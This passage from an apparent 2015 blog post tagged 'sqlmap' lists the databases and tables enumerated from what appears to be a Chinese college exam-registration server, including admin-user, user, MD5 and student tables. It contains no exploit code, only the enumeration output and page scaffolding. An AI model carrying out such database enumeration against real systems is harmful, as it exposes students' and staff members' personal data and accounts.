+| CollegeForeignLanguageTest102.a_bj          |
+| CollegeForeignLanguageTest102.a_xy          |
+| CollegeForeignLanguageTest102.a_zy          |
+| CollegeForeignLanguageTest102.b_kkyyjb      |
+| CollegeForeignLanguageTest102.bp_jd         |
+| CollegeForeignLanguageTest102.d_accept      |
+| CollegeForeignLanguageTest102.t_ks_modify   |
+| CollegeForeignLanguageTest102.t_ks_modify   |
+| CollegeForeignLanguageTest102.v_bmcount2_sd |
+| CollegeForeignLanguageTest102.v_bmcount2_sd |
+| CollegeForeignLanguageTest102.v_bmcount_sd  |
+| CollegeForeignLanguageTest102.v_bmcount_sd  |
+| CollegeForeignLanguageTest102.v_bpcount2_sd |
+| CollegeForeignLanguageTest102.v_bpcount2_sd |
+| CollegeForeignLanguageTest102.v_bpcount_sd  |
+| CollegeForeignLanguageTest102.v_bpcount_sd  |
+| CollegeForeignLanguageTest102.v_jtbm_sd     |
+| CollegeForeignLanguageTest102.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest102.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest102.v_ks_sd       |
+| CollegeForeignLanguageTest102.v_tj_bkrs     |
+| CollegeForeignLanguageTest102.v_yyjb_sd     |
+| CollegeForeignLanguageTest111.b_kkyyjb      |
+| CollegeForeignLanguageTest111.bp_jd         |
+| CollegeForeignLanguageTest111.d_accept      |
+| CollegeForeignLanguageTest111.t_ks_modify   |
+| CollegeForeignLanguageTest111.v_bmcount2_sd |
+| CollegeForeignLanguageTest111.v_bmcount2_sd |
+| CollegeForeignLanguageTest111.v_bmcount_sd  |
+| CollegeForeignLanguageTest111.v_bmcount_sd  |
+| CollegeForeignLanguageTest111.v_bpcount2_sd |
+| CollegeForeignLanguageTest111.v_bpcount2_sd |
+| CollegeForeignLanguageTest111.v_bpcount_sd  |
+| CollegeForeignLanguageTest111.v_bpcount_sd  |
+| CollegeForeignLanguageTest111.v_jtbm_sd     |
+| CollegeForeignLanguageTest111.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest111.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest111.v_ks_sd       |
+| CollegeForeignLanguageTest111.v_tj_bkrs     |
+| CollegeForeignLanguageTest111.v_yyjb_sd     |
+| CollegeForeignLanguageTest112.a_bj          |
+| CollegeForeignLanguageTest112.a_xy          |
+| CollegeForeignLanguageTest112.a_zy          |
+| CollegeForeignLanguageTest112.b_kkyyjb      |
+| CollegeForeignLanguageTest112.bp_jd         |
+| CollegeForeignLanguageTest112.d_accept      |
+| CollegeForeignLanguageTest112.t_ks_modify   |
+| CollegeForeignLanguageTest112.t_ks_modify   |
+| CollegeForeignLanguageTest112.v_bmcount2_sd |
+| CollegeForeignLanguageTest112.v_bmcount2_sd |
+| CollegeForeignLanguageTest112.v_bmcount_sd  |
+| CollegeForeignLanguageTest112.v_bmcount_sd  |
+| CollegeForeignLanguageTest112.v_bpcount2_sd |
+| CollegeForeignLanguageTest112.v_bpcount2_sd |
+| CollegeForeignLanguageTest112.v_bpcount_sd  |
+| CollegeForeignLanguageTest112.v_bpcount_sd  |
+| CollegeForeignLanguageTest112.v_jtbm_sd     |
+| CollegeForeignLanguageTest112.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest112.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest112.v_ks_sd       |
+| CollegeForeignLanguageTest112.v_tj_bkrs     |
+| CollegeForeignLanguageTest112.v_yyjb_sd     |
+| CollegeForeignLanguageTest121.a_bj          |
+| CollegeForeignLanguageTest121.a_xy          |
+| CollegeForeignLanguageTest121.a_zy          |
+| CollegeForeignLanguageTest121.b_kkyyjb      |
+| CollegeForeignLanguageTest121.bp_jd         |
+| CollegeForeignLanguageTest121.d_accept      |
+| CollegeForeignLanguageTest121.t_ks_modify   |
+| CollegeForeignLanguageTest121.t_ks_modify   |
+| CollegeForeignLanguageTest121.v_bmcount2_sd |
+| CollegeForeignLanguageTest121.v_bmcount2_sd |
+| CollegeForeignLanguageTest121.v_bmcount_sd  |
+| CollegeForeignLanguageTest121.v_bmcount_sd  |
+| CollegeForeignLanguageTest121.v_bpcount2_sd |
+| CollegeForeignLanguageTest121.v_bpcount2_sd |
+| CollegeForeignLanguageTest121.v_bpcount_sd  |
+| CollegeForeignLanguageTest121.v_bpcount_sd  |
+| CollegeForeignLanguageTest121.v_jtbm_sd     |
+| CollegeForeignLanguageTest121.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest121.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest121.v_ks_sd       |
+| CollegeForeignLanguageTest121.v_tj_bkrs     |
+| CollegeForeignLanguageTest121.v_yyjb_sd     |
+| CollegeForeignLanguageTest122.a_bj          |
+| CollegeForeignLanguageTest122.a_xy          |
+| CollegeForeignLanguageTest122.a_zy          |
+| CollegeForeignLanguageTest122.b_kkyyjb      |
+| CollegeForeignLanguageTest122.bp_jd         |
+| CollegeForeignLanguageTest122.d_accept      |
+| CollegeForeignLanguageTest122.t_ks_modify   |
+| CollegeForeignLanguageTest122.t_ks_modify   |
+| CollegeForeignLanguageTest122.v_bmcount2_sd |
+| CollegeForeignLanguageTest122.v_bmcount2_sd |
+| CollegeForeignLanguageTest122.v_bmcount_sd  |
+| CollegeForeignLanguageTest122.v_bmcount_sd  |
+| CollegeForeignLanguageTest122.v_bpcount2_sd |
+| CollegeForeignLanguageTest122.v_bpcount2_sd |
+| CollegeForeignLanguageTest122.v_bpcount_sd  |
+| CollegeForeignLanguageTest122.v_bpcount_sd  |
+| CollegeForeignLanguageTest122.v_jtbm_sd     |
+| CollegeForeignLanguageTest122.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest122.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest122.v_ks_sd       |
+| CollegeForeignLanguageTest122.v_tj_bkrs     |
+| CollegeForeignLanguageTest122.v_yyjb_sd     |
+| CollegeForeignLanguageTest131.a_bj          |
+| CollegeForeignLanguageTest131.a_xy          |
+| CollegeForeignLanguageTest131.a_zy          |
+| CollegeForeignLanguageTest131.b_kkyyjb      |
+| CollegeForeignLanguageTest131.bp_jd         |
+| CollegeForeignLanguageTest131.d_accept      |
+| CollegeForeignLanguageTest131.t_ks_modify   |
+| CollegeForeignLanguageTest131.t_ks_modify   |
+| CollegeForeignLanguageTest131.v_bmcount2_sd |
+| CollegeForeignLanguageTest131.v_bmcount2_sd |
+| CollegeForeignLanguageTest131.v_bmcount_sd  |
+| CollegeForeignLanguageTest131.v_bmcount_sd  |
+| CollegeForeignLanguageTest131.v_bpcount2_sd |
+| CollegeForeignLanguageTest131.v_bpcount2_sd |
+| CollegeForeignLanguageTest131.v_bpcount_sd  |
+| CollegeForeignLanguageTest131.v_bpcount_sd  |
+| CollegeForeignLanguageTest131.v_jtbm_sd     |
+| CollegeForeignLanguageTest131.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest131.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest131.v_ks_sd       |
+| CollegeForeignLanguageTest131.v_tj_bkrs     |
+| CollegeForeignLanguageTest131.v_yyjb_sd     |
+| CollegeForeignLanguageTest132.a_bj          |
+| CollegeForeignLanguageTest132.a_xy          |
+| CollegeForeignLanguageTest132.a_zy          |
+| CollegeForeignLanguageTest132.b_kkyyjb      |
+| CollegeForeignLanguageTest132.bp_jd         |
+| CollegeForeignLanguageTest132.d_accept      |
+| CollegeForeignLanguageTest132.t_ks_modify   |
+| CollegeForeignLanguageTest132.t_ks_modify   |
+| CollegeForeignLanguageTest132.v_bmcount2_sd |
+| CollegeForeignLanguageTest132.v_bmcount2_sd |
+| CollegeForeignLanguageTest132.v_bmcount_sd  |
+| CollegeForeignLanguageTest132.v_bmcount_sd  |
+| CollegeForeignLanguageTest132.v_bpcount2_sd |
+| CollegeForeignLanguageTest132.v_bpcount2_sd |
+| CollegeForeignLanguageTest132.v_bpcount_sd  |
+| CollegeForeignLanguageTest132.v_bpcount_sd  |
+| CollegeForeignLanguageTest132.v_jtbm_sd     |
+| CollegeForeignLanguageTest132.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest132.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest132.v_ks_sd       |
+| CollegeForeignLanguageTest132.v_tj_bkrs     |
+| CollegeForeignLanguageTest132.v_yyjb_sd     |
+| CollegeForeignLanguageTest141.a_bj          |
+| CollegeForeignLanguageTest141.a_xy          |
+| CollegeForeignLanguageTest141.a_zy          |
+| CollegeForeignLanguageTest141.b_kkyyjb      |
+| CollegeForeignLanguageTest141.bp_jd         |
+| CollegeForeignLanguageTest141.d_accept      |
+| CollegeForeignLanguageTest141.t_ks_modify   |
+| CollegeForeignLanguageTest141.t_ks_modify   |
+| CollegeForeignLanguageTest141.v_bmcount2_sd |
+| CollegeForeignLanguageTest141.v_bmcount2_sd |
+| CollegeForeignLanguageTest141.v_bmcount_sd  |
+| CollegeForeignLanguageTest141.v_bmcount_sd  |
+| CollegeForeignLanguageTest141.v_bpcount2_sd |
+| CollegeForeignLanguageTest141.v_bpcount2_sd |
+| CollegeForeignLanguageTest141.v_bpcount_sd  |
+| CollegeForeignLanguageTest141.v_bpcount_sd  |
+| CollegeForeignLanguageTest141.v_jtbm_sd     |
+| CollegeForeignLanguageTest141.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest141.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest141.v_ks_sd       |
+| CollegeForeignLanguageTest141.v_tj_bkrs     |
+| CollegeForeignLanguageTest141.v_yyjb_sd     |
+| CollegeForeignLanguageTest142.a_bj          |
+| CollegeForeignLanguageTest142.a_xy          |
+| CollegeForeignLanguageTest142.a_zy          |
+| CollegeForeignLanguageTest142.b_kkyyjb      |
+| CollegeForeignLanguageTest142.bp_jd         |
+| CollegeForeignLanguageTest142.d_accept      |
+| CollegeForeignLanguageTest142.t_ks_modify   |
+| CollegeForeignLanguageTest142.t_ks_modify   |
+| CollegeForeignLanguageTest142.v_bmcount2_sd |
+| CollegeForeignLanguageTest142.v_bmcount2_sd |
+| CollegeForeignLanguageTest142.v_bmcount_sd  |
+| CollegeForeignLanguageTest142.v_bmcount_sd  |
+| CollegeForeignLanguageTest142.v_bpcount2_sd |
+| CollegeForeignLanguageTest142.v_bpcount2_sd |
+| CollegeForeignLanguageTest142.v_bpcount_sd  |
+| CollegeForeignLanguageTest142.v_bpcount_sd  |
+| CollegeForeignLanguageTest142.v_jtbm_sd     |
+| CollegeForeignLanguageTest142.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest142.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest142.v_ks_sd       |
+| CollegeForeignLanguageTest142.v_tj_bkrs     |
+| CollegeForeignLanguageTest142.v_yyjb_sd     |
+| CollegeForeignLanguageTest151.a_bj          |
+| CollegeForeignLanguageTest151.a_xy          |
+| CollegeForeignLanguageTest151.a_zy          |
+| CollegeForeignLanguageTest151.b_kkyyjb      |
+| CollegeForeignLanguageTest151.bp_jd         |
+| CollegeForeignLanguageTest151.d_accept      |
+| CollegeForeignLanguageTest151.t_ks_modify   |
+| CollegeForeignLanguageTest151.t_ks_modify   |
+| CollegeForeignLanguageTest151.v_bmcount2_sd |
+| CollegeForeignLanguageTest151.v_bmcount2_sd |
+| CollegeForeignLanguageTest151.v_bmcount_sd  |
+| CollegeForeignLanguageTest151.v_bmcount_sd  |
+| CollegeForeignLanguageTest151.v_bpcount2_sd |
+| CollegeForeignLanguageTest151.v_bpcount2_sd |
+| CollegeForeignLanguageTest151.v_bpcount_sd  |
+| CollegeForeignLanguageTest151.v_bpcount_sd  |
+| CollegeForeignLanguageTest151.v_jtbm_sd     |
+| CollegeForeignLanguageTest151.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest151.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest151.v_ks_sd       |
+| CollegeForeignLanguageTest151.v_tj_bkrs     |
+| CollegeForeignLanguageTest151.v_yyjb_sd     |
+| Dict                                        |
+| LogDel                                      |
+| LogExport                                   |
+| LogImport                                   |
+| LogMsg                                      |
+| a_bj                                        |
+| a_fg                                        |
+| a_sex                                       |
+| a_sf                                        |
+| a_xq_sd                                     |
+| a_xq_sd                                     |
+| a_xx                                        |
+| a_xy                                        |
+| a_zy                                        |
+| b_jkls                                      |
+| b_kcwz                                      |
+| b_user                                      |
+| b_xl                                        |
+| b_yyjb                                      |
+| b_zjlx                                      |
+| books_cet46                                 |
+| checkdata                                   |
+| d_jtbm                                      |
+| d_txl                                       |
+| dtproperties                                |
+| qk                                          |
+| stu$                                        |
+| sysconstraints                              |
+| syssegments                                 |
+| t_ks_archives                               |
+| t_ks_modify_center                          |
+| temp0403                                    |
+| temp2015_04_01                              |
+| tempcet6qxmd                                |
+| tempjf                                      |
+| viewPrintInfoNew                            |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>
+
+<p>Database: djks
+[110 tables]
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+| DragonV_BM                                  |
+| DragonV_CJ                                  |
+| DragonV_PrintInfo                           |
+| Dragon_AdminUser                            |
+| Dragon_BM01                                 |
+| Dragon_BM02                                 |
+| Dragon_BM34$                                |
+| Dragon_BM34$                                |
+| Dragon_BM35                                 |
+| Dragon_BM36                                 |
+| Dragon_BM37new                              |
+| Dragon_BM37new                              |
+| Dragon_BM37old                              |
+| Dragon_BM_Save                              |
+| Dragon_BM_md5                               |
+| Dragon_BM_md5                               |
+| Dragon_CJ_Save                              |
+| Dragon_CJ_Save                              |
+| Dragon_CR                                   |
+| Dragon_News                                 |
+| Dragon_NonSchoolStu                         |
+| Dragon_Students                             |
+| T_cardlist                                  |
+| Tc_Blcj_bak                                 |
+| Tc_Blcj_bak                                 |
+| Tc_Cjdj_bak                                 |
+| Tc_Cjdj_bak                                 |
+| Tc_JBYY1                                    |
+| Tc_Mz_bak                                   |
+| Tc_Mz_bak                                   |
+| Tc_Pxzl_bak                                 |
+| Tc_Pxzl_bak                                 |
+| Tc_Sjqk_bak                                 |
+| Tc_Sjqk_bak                                 |
+| Tc_Whcd_bak                                 |
+| Tc_Whcd_bak                                 |
+| Tc_Wjcf_bak                                 |
+| Tc_Wjcf_bak                                 |
+| Tc_Xb_bak                                   |
+| Tc_Xb_bak                                   |
+| Tc_Zy_bak                                   |
+| Tc_Zy_bak                                   |
+| allstu2012                                  |
+| dtproperties                                |
+| k33cj                                       |
+| k35cj                                       |
+| ncre36                                      |
+| sysconstraints                              |
+| syssegments                                 |
+| t_basicedit_bak                             |
+| t_basicedit_bak                             |
+| t_bm                                        |
+| t_bshhkc                                    |
+| t_bskcsy                                    |
+| t_cardcontent                               |
+| t_cj                                        |
+| t_cw                                        |
+| t_cwsbbz                                    |
+| t_dict                                      |
+| t_edittype_bak                              |
+| t_edittype_bak                              |
+| t_functions                                 |
+| t_jsmd                                      |
+| t_kcxx                                      |
+| t_kdxx                                      |
+| t_ksda                                      |
+| t_kswj                                      |
+| t_omr                                       |
+| t_scbjg                                     |
+| t_setting                                   |
+| t_sjkcqk                                    |
+| t_sjkcsy                                    |
+| t_sjkcwz                                    |
+| t_sjsq                                      |
+| t_sjxtsj                                    |
+| t_usergroups                                |
+| t_useringroups                              |
+| t_users                                     |
+| t_version                                   |
+| t_zkzbak_kd                                 |
+| t_zkzbak_ks                                 |
+| tc_jbyy_bak                                 |
+| tc_jbyy_bak                                 |
+| tc_kdqk_bak                                 |
+| tc_kdqk_bak                                 |
+| tc_kqdm_bak                                 |
+| tc_kqdm_bak                                 |
+| temp20141218                                |
+| temp_Dragon_BM1                             |
+| temp_Dragon_BM1                             |
+| temp_cjb                                    |
+| temp_jfstu                                  |
+| temp_mdnew1                                 |
+| temp_mdnew1                                 |
+| temp_mdold                                  |
+| temp_ncrejf                                 |
+| temp_njf                                    |
+| temp_nopay                                  |
+| temp_pay_ncre39                             |
+| tempcj34                                    |
+| v_allbsbpkc                                 |
+| v_bm_checkyyjb                              |
+| v_bsbpkc                                    |
+| v_bskc                                      |
+| v_dsjg                                      |
+| v_hhkcrs                                    |
+| v_kdjg                                      |
+| v_ksxx                                      |
+| v_sjbpkc                                    |
+| v_ssjg                                      |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>
+
+<p>Database: exam
+[17 tables]
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+| PaperList                                   |
+| TaskList                                    |
+| dtproperties                                |
+| exam_paperlib_Save                          |
+| exam_paperlib_Save                          |
+| exam_score_save                             |
+| exam_score_save                             |
+| exam_users                                  |
+| sysconstraints                              |
+| syssegments                                 |
+| v_answercount                               |
+| v_exam_paperlist                            |
+| v_exam_score_detail                         |
+| v_exam_score_detail                         |
+| v_examstudents                              |
+| v_finishtask                                |
+| v_scorestat                                 |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>
+</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-06-06T11:37:40+08:00" pubdate data-updated="true"></time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/sqlmap/'>sqlmap</a>
+
+
+</div>
+	
+</div>
+</article>
+
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+		
+		
+		<a class="addthis_button_tweet"></a>
+		
+		
+		
+	</div>
+	
+</div>
+
+
+</div>
+	<footer id="footer" class="inner">
+
+Copyright &copy; 2015
+
+    K
+
+
+</footer>
+	<script src="/javascripts/slash.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+
+
+
+
+</body>
+</html>
